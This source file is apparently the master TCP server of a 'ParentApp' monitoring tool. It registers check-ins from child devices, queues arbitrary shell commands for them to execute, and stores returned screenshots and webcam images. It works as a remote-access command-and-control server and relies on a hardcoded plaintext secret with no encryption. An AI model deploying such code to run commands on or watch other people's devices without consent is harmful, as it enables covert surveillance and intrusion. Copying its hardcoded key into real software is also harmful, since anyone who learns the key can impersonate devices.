# =============================================================================
# ParentApp/core/bg_server.dz — Dedicated Master TCP Server Thread
# Handles Reverse Check-ins, Liveness, Real-time Sessions & Commands
# =============================================================================

use net
use process
use file
use dir
use path
use json
use datetime

let MASTER_PORT = 9999
let SECRET_KEY = "KIDS_CTRL_2026"
let OFFLINE_TIMEOUT = 3.5

let BASE_DIR = "."
if file.exists("ParentApp/main.dz")
    BASE_DIR = "ParentApp"
end

let DEVICES_FILE = path.join(BASE_DIR, "children.json")
let PENDING_CMDS_FILE = path.join(BASE_DIR, "storage", "pending_cmds.json")
let RESULTS_DIR = path.join(BASE_DIR, "storage", "results")

# Helpers for storage
fn getSsDir(deviceId)
    let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")
    let d = path.join(BASE_DIR, "storage", "screenshots", safeId)
    try dir.createAll(d) catch e end
    return d
end

fn getWcDir(deviceId)
    let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")
    let d = path.join(BASE_DIR, "storage", "webcam", safeId)
    try dir.createAll(d) catch e end
    return d
end

fn autoArchive(deviceId, rawData)
    if isNull(rawData) or type(rawData) != "String"
        return
    end

    let now = datetime.now()
    let ts = str(now.year()) + "-" + str(now.month()) + "-" + str(now.day()) + "_" + str(now.hour()) + "-" + str(now.minute()) + "-" + str(now.second())
    let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")

    if rawData.startsWith("SCREENSHOT:")
        let b64 = rawData.substring(11).strip()
        if b64 != "" and !b64.startsWith("ERR:")
            let sDir = getSsDir(safeId)
            let filePath = path.join(sDir, ts + ".b64")
            try file.write(filePath, b64) catch e end
        end
    elif rawData.startsWith("WEBCAM:")
        let b64 = rawData.substring(7).strip()
        if b64 != "" and b64 != "NO_WEBCAM" and !b64.startsWith("ERR:")
            let wDir = getWcDir(safeId)
            let filePath = path.join(wDir, ts + ".b64")
            try file.write(filePath, b64) catch e end
        end
    end
end

# In-memory session tracking
let sessions = {}

# Load existing devices with offline initial state
try
    if file.isFile(DEVICES_FILE)
        let dData = file.read(DEVICES_FILE)
        let list = json.decode(dData)
        if type(list) == "Array"
            for d in list
                if type(d) == "Map" and d.has("id")
                    d["is_online"] = False
                    d["last_seen"] = 0
                    sessions[d["id"]] = d
                end
            end
            file.write(DEVICES_FILE, json.encode(list))
        end
    end
catch e end

# Master TCP Server Instance
let srv = new net.tcpServer(fn(client, clientIp, clientPort)
    let raw = client.receiveAll()
    if isNull(raw) or raw == ""
        client.close()
        return
    end

    let req = Null
    try req = json.decode(raw) catch e client.close() return end
    if type(req) != "Map" or !req.has("id") or !req.has("secret")
        client.close()
        return
    end

    if req["secret"] != SECRET_KEY
        client.close()
        return
    end

    let devId = req["id"]
    let hostname = clientIp
    if req.has("hostname") and req["hostname"] != ""
        hostname = req["hostname"]
    end
    let reportedIp = clientIp
    if req.has("ip") and req["ip"] != ""
        reportedIp = req["ip"]
    end
    let nowTs = datetime.now().timestamp()

    # Update or create session
    if !sessions.has(devId)
        sessions[devId] = {
            "id": devId,
            "hostname": hostname,
            "custom_name": "",
            "ip": reportedIp,
            "is_online": True,
            "last_seen": nowTs
        }
    else
        let s = sessions[devId]
        s["hostname"] = hostname
        s["ip"] = reportedIp
        s["is_online"] = True
        s["last_seen"] = nowTs
    end

    # Sync sessions map to children.json
    try
        let listToSave = []
        for k in sessions.keys()
            listToSave.append(sessions[k])
        end
        file.write(DEVICES_FILE, json.encode(listToSave))
    catch e end

    # Handle returned command output
    if req.has("result_cmd_id") and req["result_cmd_id"] != ""
        let cId = req["result_cmd_id"]
        let resData = ""
        if req.has("result")
            resData = req["result"]
        end
        let resFile = path.join(RESULTS_DIR, cId + ".json")
        try file.write(resFile, json.encode({"data": resData})) catch e end
        autoArchive(devId, resData)
    end

    # Check for pending commands to dispatch to child
    let replyPayload = {"status": "OK", "action": "IDLE"}
    try
        if file.isFile(PENDING_CMDS_FILE)
            let pData = file.read(PENDING_CMDS_FILE)
            let pMap = json.decode(pData)
            if type(pMap) == "Map" and pMap.has(devId)
                let q = pMap[devId]
                if type(q) == "Array" and q.length() > 0
                    let nextCmd = q.pop(0)
                    replyPayload = {
                        "status": "OK",
                        "action": "EXEC",
                        "cmd_id": nextCmd["cmd_id"],
                        "command": nextCmd["command"]
                    }
                    file.write(PENDING_CMDS_FILE, json.encode(pMap))
                end
            end
        end
    catch e end

    client.send(json.encode(replyPayload))
    client.shutdown(net.SD_SEND)
    client.close()
end)

# Start listening
print("[Master Server] Background TCP Server listening on 0.0.0.0:" + str(MASTER_PORT))
try
    srv.listen(MASTER_PORT)
catch e
    print("[Master Server] Listen error: " + str(e))
end
